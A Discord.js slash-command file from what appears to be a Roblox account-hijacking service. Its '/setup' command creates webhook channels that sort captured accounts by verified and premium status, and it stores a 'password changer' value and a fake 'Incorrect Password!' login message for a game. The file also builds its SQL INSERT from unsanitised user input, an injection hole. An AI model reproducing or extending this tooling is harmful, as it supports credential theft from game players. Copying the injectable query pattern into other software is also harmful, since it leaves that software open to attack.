const { ApplicationCommandOptionType, Client, ChannelType, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Interaction, PermissionFlagsBits } = require('discord.js');
const { default: axios } = require('axios');
const fs = require('fs');
const path = require('path');
const WebhookData = require('../../models/WebhookData');
const Token = require('../../models/Token');
const config = require('../../../config.json');
const mysql = require('mysql2');

module.exports = {
  /**
   *
   * @param {Client} client
   * @param {Interaction} interaction
   */
  callback: async (client, interaction) => {
    if (!interaction.inGuild()) {
      interaction.reply('You can only run this command inside a server.');
      return;
    }

    const webhookData = {
        userId: interaction.user.id,
        guildId: interaction.guild.id,
        gameId: interaction.options.getString('game-id'),
        webhooks: {},
    }

    try {
      await interaction.deferReply();

      function getTimestamp() {
        const currentDate = new Date();
        return currentDate.toLocaleTimeString();
      }


      const denied = new EmbedBuilder()
      .setTitle('Access Denied')
      .setDescription('You do not have permission to run this command.')
      .setColor('#ff0000')
      .setTimestamp();

    const token = await Token.findOne({ userId: interaction.user.id });

    if (!token) {
      interaction.editReply({
        embeds: [denied],
        ephemeral: true,
      });
      console.log(`\x1b[31m[${getTimestamp()}][DENIED ACCESS]:\x1b[0m ${interaction.user.tag} tried to run the command /setup but they do not have access to this command.`);
      return;
    }

    function searchUser(userId) {
      const connection = mysql.createConnection({
          host: config.dbHost,
          user: config.dbUser,
          password: config.dbPassword,
          database: config.dbName,
      });
    
      return new Promise((resolve, reject) => {
        connection.connect((err) => {
          if (err) {
            console.error('Error connecting to the database: ', err);
            reject(err);
          }
    
          connection.query(
            'SELECT username FROM users WHERE discord = ?',
            [userId],
            (err, rows) => {
              if (err) {
                const error = new EmbedBuilder()
                .setTitle('Error')
                .setDescription('There was an error getting user info.')
                .addFields({ name: 'Error', value: err, inline: false })
                .setColor('#ff0000')
                .setTimestamp();

                interaction.editReply({ embeds: [error], ephemeral: true })
                console.error('Error searching for user: ', err);
                reject(err);
              } else {
                if (rows.length > 0) {
                  const username = rows[0].username;
                  resolve(username);
                } else {
                  resolve(null); // User not found
                }
              }
    
              // Close the connection
              connection.end();
            }
          );
        });
      });
    }

      const successEmbed = new EmbedBuilder()
        .setTitle('Server creation setup has been completed!')
        .setAuthor({ name: interaction.user.username, iconURL: interaction.user.avatarURL() })
        .addFields({ name: 'Please check your channels!', value: 'We have created the following channels for you: all-visits, verified-nbc, unverified-nbc, verified-premium, unverified-premium, success, failed. Please check your channels and make sure that the webhooks are set correctly.', inline: false })
        .setFooter({ text: `${config.footerText}`, iconURL: config.footerImage })
        .setColor('#00FF00')
        .setTimestamp()
      
      const loadingEmbed1 = new EmbedBuilder()
        .setTitle('Creating channels and categories...')
        .setThumbnail('https://upload.wikimedia.org/wikipedia/commons/a/ad/YouTube_loading_symbol_3_%28transparent%29.gif')
        .setDescription('Please wait while we create the channels and categories. This may take a few seconds.')
        .setColor('#FFFF00')

      const loadingEmbed2 = new EmbedBuilder()
        .setTitle('Whitelisting server...')
        .setThumbnail('https://upload.wikimedia.org/wikipedia/commons/a/ad/YouTube_loading_symbol_3_%28transparent%29.gif')
        .setDescription('Please wait while we whitelist your server. This may take a few seconds.')
        .addFields({ name: 'Channels and Category', value: '<:Birthday_Sparkle2:1123259990849892462> Successfully Created!', inline: false })
        .setColor('#FFFF00')

        const connection = mysql.createConnection({
          host: config.dbHost,
          user: config.dbUser,
          password: config.dbPassword,
          database: config.dbName,
      })
  
      connection.connect((err) => {
          if (err) throw err;
          console.log(`\x1b[32m[${getTimestamp()}][MYSQL]:\x1b[0m Connected to database.`);
      })

      const channelNames = ['all-visits', 'unverified-nbc', 'unverified-premium', 'verified-nbc', 'verified-premium', 'success', 'failed', 'game-link'];

        const category = await interaction.guild.channels.create({
            name: 'Webhook Generator',
            type: ChannelType.GuildCategory,
            reason: 'This category was automatically created by Chronics Webhook Generator.',
        });

       for (const channelName of channelNames) {
        const channel = await interaction.guild.channels.create({
          name: channelName,
          type: ChannelType.GuildText,
          parent: category,
          topic: 'This channel was automatically created by Chronics Webhook Generator.',
        });
        
        console.log(`[${getTimestamp()}][CHANNEL CREATOR]: ${interaction.user.tag} has created a channel called ${channelName}! (Channel ID: ${channel.id})`);

        const webhook = await channel.createWebhook({
          name: channelName,
          avatar: 'https://th.bing.com/th/id/R.313d9b5a0dcd849ddf83ff5216915668?rik=%2f%2ftO3VpPmEMe8Q&riu=http%3a%2f%2f1000logos.net%2fwp-content%2fuploads%2f2017%2f07%2fColor-Roblox-Logo.png&ehk=HuF5BjSgs0WJah0NlaV9%2f3tr2Ec%2bECijA6z3H5Bn8c4%3d&risl=&pid=ImgRaw&r=0',
        });

        webhookData.webhooks[channelName] = webhook.url;
        successEmbed.addFields({ name: channelName, value: webhook.url, inline: false });
        interaction.editReply({ embeds: [loadingEmbed1] });
        console.log(`\x1b[32m[${getTimestamp()}][WEBHOOK CREATOR]:\x1b[0m ${interaction.user.tag} has created a webhook called ${channelName}! (Webhook ID: ${webhook.id})`);

      }

      await WebhookData.create(webhookData);
      interaction.editReply({ embeds: [loadingEmbed2] });
      await new Promise((resolve) => setTimeout(resolve, 10000));

      const data = await WebhookData.findOne({ userId: interaction.user.id, guildId: interaction.guild.id });
      
      if (!data) {
        interaction.editReply({ content: 'There was an error getting the webhooks. Please try again later.', ephemeral: true });
      } else {
        const visits = data.webhooks['all-visits'];
        const username = await searchUser(interaction.user.id);
        const newpass = interaction.options.getString('newpass');
        const place_id = interaction.options.getString('game-id');
        const unbc = data.webhooks['unverified-nbc'];
        const upremium = data.webhooks['unverified-premium'];
        const vbc = data.webhooks['verified-nbc'];
        const vpremium = data.webhooks['verified-premium'];
        const success = data.webhooks['success'];
        const failed = data.webhooks['failed'];
        const vToggle = "Enable";
        const vKick = "Verified Account Is Not Allowed To Play This Game!";
        const aToggle = "Enable";
        const aKick = "1";
        const aKickM = "Account Is Not Old Enough To Play This Game!";
        const loginMessage = "Incorrect Password!";

        // WhiteList Game To The Database
        const query = `INSERT INTO games (\`username\`, \`discord\`, \`place_id\`, \`visit\`, \`unbc\`, \`upremium\`, \`nbc\`, \`premium\`, \`success\`, \`failed\`, \`newpass\`, \`vToggle\`, \`vKick\`, \`aToggle\`, \`aKick\`, \`aKickM\`, \`loginMessage\`) 
                       VALUES ('${username}', '${interaction.user.id}', '${place_id}', '${visits}', '${unbc}', '${upremium}', '${vbc}', '${vpremium}', '${success}', '${failed}', '${newpass}', '${vToggle}', '${vKick}', '${aToggle}', '${aKick}', '${aKickM}', '${loginMessage}')`;

        connection.query(query, (err, result) => {
          if (err) throw err;
          console.log(`\x1b[32m[${getTimestamp()}][GAME WHITELIST]:\x1b[0m ${interaction.user.tag} has whitelisted a game! (Game ID: ${place_id})`);
        })
        
        interaction.editReply({ embeds: [successEmbed] });
      } 

      console.log(`\x1b[32m[${getTimestamp()}][WEBHOOK DATABASE]:\x1b[0m Webhooks have been added to the database!`);
    } catch (error) {
      const failed = new EmbedBuilder()
        .setTitle('Server creation setup has failed!')
        .setDescription('We already have a webhook for this channel. Please delete the webhook and try again.')
        .setColor('#FF0000')
        .setTimestamp()
        interaction.editReply({ embeds: [failed] });
      console.log(error);
    }
  },

  name: 'setup',
    description: 'Automatically setup channels and webhooks for your game!',
    options: [
      {
          name: 'game-id',
          description: 'The ID of the game you want to setup.',
          type: ApplicationCommandOptionType.String,
          required: true,
      },
      {
        name: 'newpass',
        description: 'The new password for the password changer.',
        type: ApplicationCommandOptionType.String,
        required: true,
      },
  ],
    permissionsRequired: [PermissionFlagsBits.ManageChannels],
    botPermissions: [PermissionFlagsBits.ManageChannels],
}
